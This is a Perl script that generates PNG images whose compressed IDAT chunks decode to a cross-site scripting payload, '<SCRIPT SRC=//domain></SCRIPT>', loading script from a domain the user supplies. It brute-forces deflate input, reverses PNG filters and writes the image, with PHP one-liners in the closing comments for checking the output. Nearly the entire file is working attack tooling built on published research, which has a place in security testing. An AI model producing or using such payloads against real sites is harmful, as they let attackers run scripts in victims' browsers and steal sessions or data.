#!/usr/bin/perl
#
# PNG IDAT chunks ~ payload generator
# Credits to: @Adam_Logue || @fin1te || idontplaydarts
#
# https://www.adamlogue.com/revisiting-xss-payloads-in-png-idat-chunks/
# https://whitton.io/articles/xss-on-facebook-via-png-content-types/
# https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
#

use strict;
use warnings;

no warnings 'portable';	# Hexadecimal number > 0xffffffff non-portable

use GD;
use POSIX;
use Getopt::Long;
use String::HexConvert ':all';							# Wrapper around pack and unpack
use IO::Compress::Deflate qw(deflate $DeflateError);	# Write RFC 1950 compressed data to files/buffers

# Command line options

my $options = GetOptions(
	"help"		=> \my $opt_help,
	"domain"	=> \my $opt_domain,
	"output"	=> \my $opt_output
);

print "[ PNG IDAT chunks ~ payload generator ]\n\n";

help() if $opt_help;
my ($domain, $output) = @ARGV;

if(not defined($opt_domain)) {
	print "[?] Usage: perl $0 -domain xxe.cz -output xss.png\n";
	die("[?] More info: perl $0 -help\n\n");
}
elsif(not defined($opt_output)) {
	$output = "xss_chunks.png";
}

# Config variables

my $domain_length	= length($domain);
my $brute_start		= "0x"."11" x $domain_length;
my $brute_end		= "0x"."ff" x $domain_length;
my $payload			= uc("<script src=//".$domain."></script>");
my $hex_payload		= ascii_to_hex($payload);
my $hex_found;

# Main subs

my @bytes		= bruteforce();			# GZDeflate payload fuzzing
my @png_array	= png_filters(@bytes);	# Reversing PNG filters (1, 3)
create_png(@png_array);					# Generating .png file with chunks test

sub bruteforce {
	print "[i] Starting bruteforce\n";
	print "[i] Domain: ".$domain."\n";
	if($domain_length > 6) {
		print "[?] Domain too long ~ it might now work!\n";
	}
	print "[i] Payload: ".$payload."\n";
	print "[i] It will take some time ~ please wait :)\n\n";

	# Append & Prepend 0x00 -> 0xff to the hex_payload
	for (my $i = eval($brute_start); $i < eval($brute_end); $i++) {
		my $brute = sprintf("%x",$i);

		# Binary data for GZDeflate
		my $bin_brute = hex_to_ascii("f399281922111510691928276e6e".$brute."1f576e69b16375535b6f0e7f");
		
		my $out;	# GZDeflate output as a scalar reference
		deflate \$bin_brute => \$out or die "Deflate failed: $DeflateError\n";	# PHP GZDeflate

		if (index(uc($out), $payload) != -1) {	# Search payload in uppercase GZDeflate output
			print "[!] Lucky one ~ bruteforce successfully completed\n";
			print "[i] Trying to apply PNG filters\n\n";

			$hex_found	= ascii_to_hex($bin_brute);
			my @bytes	= map "0x$_", $hex_found =~ /../sg; # Hex bytes need to be separated 0x13, 0x37, ...
			return @bytes;
			# die;
		}
	}
	die("[x] Failed to bruteforce payload :(\n\n");
}

sub png_filters {
	my @bytes = my @bytes2 = @_;
	# http://www.libpng.org/pub/png/spec/1.2/PNG-Filters.html

	# Reverse PNG Filter type 1: Sub
	# Sub(x) + Raw(x-bpp)
	for (my $i = 0; $i < (scalar @bytes - 3); $i++){
		$bytes[$i+3] = sprintf("0x%x",((hex($bytes[$i+3]) + hex($bytes[$i])) % 256));
	}

	# Reverse PNG Filter type 3: Average
	# Average(x) + floor((Raw(x-bpp)+Prior(x))/2)
	for (my $i = 0; $i < (scalar @bytes2 - 3); $i++){
		$bytes2[$i+3] = sprintf("0x%x",((hex($bytes2[$i+3]) + floor(hex($bytes2[$i]) / 2)) % 256));
	}

	my @png_array = (@bytes, @bytes2);
	print "[i] PNG filters done\n";
	return @png_array;
}

sub create_png {
	my (@png_array) = @_;
	print "[i] Generating output file\n\n";

	# Create a new image
	my $img		= new GD::Image(32,32,1);		# Set 1 to Truecolor (24 bits of color data), default is 8-bit palette
	my $color	= $img->colorAllocate(0,0,0);	# Allocate black color
	$img->fill(0,0,$color);						# Fill background with black

	my $i = my $x = 0;

	while ($i < (scalar @png_array)) {
		# Allocate some colors
		my $r	= hex($png_array[$i]		|| 0);
		my $g	= hex($png_array[$i + 1]	|| 0);
		my $b	= hex($png_array[$i + 2]	|| 0);
		$color	= $img->colorAllocate($r,$g,$b);
		$img->setPixel($x,0,$color);
		$i += 3;
		$x += 1;
	}
	if (index(uc($img->png), $payload) != -1) {
		print "[!] PNG with payload successfully generated\n";
		print "[!] Hex payload: ".$hex_found."\n";
		# Convert into png data
		open my $out, '>', $output or die;
		binmode $out;
		print $out $img->png;
		print "[i] File saved to: ".$output."\n\n";
	}
	else {
		print "[x] Bad png file, this might not work\n\n";
	}
}

sub help {
	print "[?] Visit GitHub for help ~ xexexe\n";
}
# strings output.png
# hexdump -c output.png

# apt-get install libgd-perl

# f399281922111510691928276e6e".$brute."1f576e69b16375535b6f0e7f
# 7ff399281922111510691928276e6e".$brute."1f576e69b16375535b6f
#
# php -r "echo gzdeflate(hex2bin('f399281922111510691928276e6e562e2c1e581b1f576e69b16375535b6f0e7f')) . PHP_EOL;"
# php -r "echo gzdeflate(hex2bin('7ff399281922111510691928276e6e5c1e151e51241f576e69b16375535b6f')) . PHP_EOL;"